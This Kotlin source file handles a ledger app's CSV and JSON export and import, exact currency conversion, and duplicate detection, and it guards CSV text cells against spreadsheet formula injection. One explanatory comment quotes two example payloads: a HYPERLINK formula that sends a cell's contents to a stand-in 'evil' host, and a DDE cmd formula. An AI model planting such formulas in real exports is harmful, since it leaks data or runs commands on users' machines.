package kapi.core.io

import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json
import java.math.BigDecimal
import java.time.Instant
import java.time.LocalDateTime
import java.time.ZoneId
import java.time.format.DateTimeFormatter

/**
 * 账目进出：导出 / 导入。
 *
 * 放在 [core] 而不是 app 层，因为这里全是**纯函数**——没有 Room、没有 Context、
 * 没有 Android 类型。一条 CSV 到底转义对了没有、金额会不会在 Long→String 的路上
 * 丢精度，这些必须能用 `go test` 之外最便宜的方式钉死：JVM 单测跑几毫秒，
 * 而跑一次设备测试要等一个 APK 装到模拟器上。
 *
 * ## 三个不能省的约定
 *
 * ### 1. 导出按**名字**，不按 id
 *
 * 分类、账户导出的都是 `CategoryEntity.name` / `AccountEntity.name`。
 * 理由和 [kapi.ledger.ui.CategoryIcons]、分类配色完全一样：id 在不同设备、
 * 不同同步顺序下都不一样，NAS 上还会重排。导出文件是要给别人看的，
 * "餐饮"比 `cat-3` 有用得多；而且只有名字能跨设备对上号。
 *
 * ### 2. CSV 带 UTF-8 BOM
 *
 * Windows 版 Excel 打开没有 BOM 的 UTF-8 CSV，会**默默**按本地代码页（GBK）解码，
 * 于是所有中文变乱码，**不弹任何提示**。用户看到的是"导出功能坏了"，
 * 实际只是少了文件头三个字节。同一个文件在 macOS 的 Numbers 里却完全正常，
 * 更显得像玄学。BOM 不是冗余，是这三种结局里唯一可预期的那种。
 *
 * ### 3. 金额全程用 [BigDecimal]，且 CSV 里带符号
 *
 * 金额在库里是**分**（[Long]）。转成元这一步最容易写出
 * `minor / 100.0`，那会引入二进制浮点误差——`12345` 分可能是 `123.44999999999999`。
 * 这里走 [Money.toYuan] 的同款精确除法。
 *
 * CSV 里的金额**支出为负、收入为正**。这样用户拖进 Excel 直接求和就是结余，
 * 不用再套一层筛选。（库里 `direction` 和 `amountMinor` 是分开的，符号不参与存储，
 * 只在导出时补上。）
 */
object Money {
    const val MINOR_PER_MAJOR = 100L

    /** 分 → 元，精确，不用浮点。负数也正确（`-1` → `-0.01`）。 */
    fun toYuan(minor: Long): String =
        BigDecimal(minor).divide(BigDecimal(MINOR_PER_MAJOR), 2, java.math.RoundingMode.HALF_UP)
            .toPlainString()
}

/**
 * 一条可导出的账目。
 *
 * 分类和账户是**显示名**（见文件头），不是 id。
 */
@Serializable
data class TransferRow(
    val occurredAt: Long,
    val direction: String,
    val amountMinor: Long,
    val merchant: String? = null,
    val note: String? = null,
    val category: String? = null,
    val account: String? = null,
    val toAccount: String? = null,
    val source: String = "MANUAL",
) {
    /** CSV / 展示用的带符号金额。支出为负。 */
    fun signedYuan(): String {
        val mag = Money.toYuan(amountMinor)
        return if (direction == "EXPENSE") "-$mag" else mag
    }
}

@Serializable
data class TransferFile(
    val format: String = FORMAT,
    val version: Int = VERSION,
    val exportedAt: Long,
    val rows: List<TransferRow>,
) {
    companion object {
        const val FORMAT = "kapi-ledger"
        const val VERSION = 1
    }
}

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------

object LedgerCsv {

    /**
     * 表头用中文：这份文件的主要消费者是人（Excel / Numbers），不是程序。
     * 真要喂程序用 JSON。
     */
    val HEADER = listOf("时间", "收支", "金额", "商户", "分类", "账户", "转出账户", "备注")

    const val BOM = "﻿"

    /**
     * Excel 会当成公式开头的字符。
     *
     * 商户名如果叫 `=HYPERLINK("http://evil/"&A1,"点我")`，用户在 Excel 里
     * 双击看到的就是一个能点开的链接；`=cmd|'/c calc'!A0` 这类在老版本里会
     * 直接执行。这些字段全是**用户自己或商户填的自由文本**，而"导入别的
     * 记账 App 的数据"这条路还会把完全陌生的文本带进来。
     *
     * 注意 `-` 也在表里，所以**只有文本单元格能过这个门**（见 [asText]），
     * 金额列必须绕过。
     */
    private val FORMULA_LEAD = charArrayOf('=', '+', '-', '@', '\t', '\r')

    private val TS = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")

    /**
     * 导出成 CSV 文本（含 BOM）。
     *
     * 行按时间**正序**排：和账本页的倒序不同。倒序是给"看最近发生了什么"的，
     * 正序是给"从头到尾看一遍/做年度汇总"的，导出属于后者。
     */
    fun toCsv(rows: List<TransferRow>, zone: ZoneId = ZoneId.systemDefault()): String {
        val sb = StringBuilder(BOM)
        sb.append(HEADER.joinToString(",") { quote(it) })
        sb.append("\r\n")
        for (r in rows.sortedBy { it.occurredAt }) {
            val cells = listOf(
                LocalDateTime.ofInstant(Instant.ofEpochMilli(r.occurredAt), zone).format(TS),
                when (r.direction) {
                    "EXPENSE" -> "支出"; "INCOME" -> "收入"; else -> "未知"
                },
                // 金额列必须是**数字**。支出是负数，而负数正好以 "-" 开头——
                // 如果这里走带公式防护的 guard，Excel 会把它当文本，
                // 整列求和得到 0。导出 CSV 的全部意义就是"拖进去能算"。
                r.signedYuan(),
                r.merchant.orEmpty().asText(),
                r.category.orEmpty().asText(),
                r.account.orEmpty().asText(),
                r.toAccount.orEmpty().asText(),
                r.note.orEmpty().asText(),
            )
            sb.append(cells.joinToString(","))
            sb.append("\r\n")
        }
        return sb.toString()
    }

    /**
     * 文本单元格：RFC 4180 转义 **+ 公式注入防护**。
     *
     * 凡是**用户或商户能填的**字段都必须走这个，不能走 [quote]。
     */
    private fun String.asText(): String {
        val guarded = if (isNotEmpty() && this[0] in FORMULA_LEAD) "'$this" else this
        return quote(guarded)
    }

    /**
     * RFC 4180 转义。
     *
     * 含 `,` `"` 换行的字段要加引号，里面的 `"` 写成 `""`。
     * 备注里写「星巴克, 上海」不转义，Excel 会读成两列——而"导出成功、
     * 打开列错位"比直接报错难查得多。
     *
     * **不做公式防护**：这个函数是给数字和已知安全文本用的。
     * 公式防护见 [asText]，把它混进来会误伤以 `-` 开头的负数金额，
     * 把金额列变成文本列，用户求和直接得 0。
     */
    fun quote(field: String): String {
        val needsQuote = field.any { it == ',' || it == '"' || it == '\n' || it == '\r' }
        if (!needsQuote) return field
        return "\"" + field.replace("\"", "\"\"") + "\""
    }
}

// ---------------------------------------------------------------------------
// JSON
// ---------------------------------------------------------------------------

object LedgerJson {

    private val json = Json {
        prettyPrint = true
        ignoreUnknownKeys = true   // 老文件里删掉的字段不该让新版本读不了
        encodeDefaults = true
    }

    fun toJson(rows: List<TransferRow>, exportedAt: Long): String =
        json.encodeToString(TransferFile.serializer(), TransferFile(exportedAt = exportedAt, rows = rows))

    sealed interface Parsed {
        data class Ok(val rows: List<TransferRow>) : Parsed
        /** [why] 直接给用户看，要说清是哪一步不行。 */
        data class Bad(val why: String) : Parsed
    }

    fun parse(text: String): Parsed {
        val trimmed = text.trim()
        if (trimmed.isEmpty()) return Parsed.Bad("文件是空的")
        val file = try {
            json.decodeFromString(TransferFile.serializer(), trimmed)
        } catch (_: Throwable) {
            // 刻意**不把异常原文带出去**。kotlinx 的消息形如
            // "Unexpected JSON token at offset 412: Expected start of the object"，
            // 甩给用户等于让他对着字节偏移数自查。异常在这里对用户的价值
            // 只有一个：不是我们导出的，或者文件坏了。
            return Parsed.Bad("这个文件读不出来，可能不是本 App 导出的账本，或者下载不完整")
        }
        if (file.format != TransferFile.FORMAT) {
            return Parsed.Bad("这是「${file.format}」格式的账本，不是本 App 的")
        }
        if (file.version > TransferFile.VERSION) {
            return Parsed.Bad("文件版本 ${file.version} 比这个 App 新，请先升级")
        }
        if (file.rows.isEmpty()) return Parsed.Ok(emptyList())
        val bad = file.rows.firstOrNull { it.amountMinor < 0 || it.direction !in setOf("EXPENSE", "INCOME") }
        if (bad != null) {
            return Parsed.Bad("有一条金额或方向不合法（${bad.amountMinor} / ${bad.direction}），整份文件没导入")
        }
        return Parsed.Ok(file.rows)
    }
}

// ---------------------------------------------------------------------------
// 去重
// ---------------------------------------------------------------------------

object TransferFingerprint {

    /** 宽松/完整指纹共用的字段分隔符（SOH，避免字段内容串接歧义）。 */
    private const val SEQ = "\u0001"

    /**
     * 导入去重用的指纹。
     *
     * **为什么必须去重**：用户很可能把同一份文件导进来两次（第一次导错了想重来、
     * 或者换了台手机又导了一遍）。没有去重的结果是**账目翻倍**——
     * 在记账 App 里这是最严重的一类错，而且用户不会立刻发现，
     * 等发现时汇总数字已经错了一倍。
     *
     * 指纹用**业务字段**而不是 id：导出文件里没有 id（也不该有，id 跨设备无意义），
     * 而且同一笔账在两台设备上本来就该有各自的 id。
     *
     * 时间取**分钟**：两笔在同一天同一分钟、金额相同、商户相同的账，
     * 现实里几乎不可能是两次独立消费；而如果精确到毫秒，用户从两个渠道
     * （通知 + 页面）抓到同一笔时毫秒戳会差几毫秒，反而去重不掉。
     */
    fun of(row: TransferRow): String {
        val minuteBucket = Math.floorDiv(row.occurredAt, 60_000L)
        return listOf(
            row.amountMinor.toString(),
            row.direction,
            minuteBucket.toString(),
            row.merchant.orEmpty().trim(),
            row.note.orEmpty().trim(),
            row.category.orEmpty(),
            row.account.orEmpty(),
        ).joinToString(SEQ)
    }

    /**
     * 宽松指纹：金额+方向+分钟桶，**不含任何文本字段**。
     *
     * 2026-10-04 用户真机反馈：自动记账写的商户/备注（读屏抓的详情页字段）
     * 和账单导入行（导出文件里的类型/商品拼接）几乎永远一字不差地不同，
     * 完整指纹挡不住"同一笔被两个渠道各记一次"。
     *
     * 只用于**账单导入 vs 已有账目**这一处比对；文件内部去重仍用完整指纹
     * （同一文件里两行文本必然同构）。
     */
    fun looseOf(row: TransferRow): String {
        val minuteBucket = Math.floorDiv(row.occurredAt, 60_000L)
        return listOf(
            row.amountMinor.toString(),
            row.direction,
            minuteBucket.toString(),
        ).joinToString(SEQ)
    }
}
